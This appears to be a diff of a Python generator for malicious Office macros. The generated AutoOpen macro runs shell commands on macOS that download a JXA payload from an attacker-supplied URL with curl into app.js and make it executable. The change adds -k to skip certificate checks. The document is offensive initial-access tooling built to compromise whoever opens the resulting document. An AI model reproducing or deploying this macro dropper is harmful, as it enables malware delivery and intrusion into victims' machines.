@@ -14,7 +14,7 @@ url = options.jxaurl.strip()
 
 macrofile = open('macro.txt', 'w')
 macrofile.write('Sub AutoOpen()\n')
-macrofile.write("MacScript(\"do shell script \"\"curl %s -o app.js\"\" \")"%url)
+macrofile.write("MacScript(\"do shell script \"\"curl -k %s -o app.js\"\" \")"%url)
 macrofile.write("\n")
 macrofile.write("MacScript(\"do shell script \"\"chmod +x app.js\"\"\")")
 macrofile.write("\n")
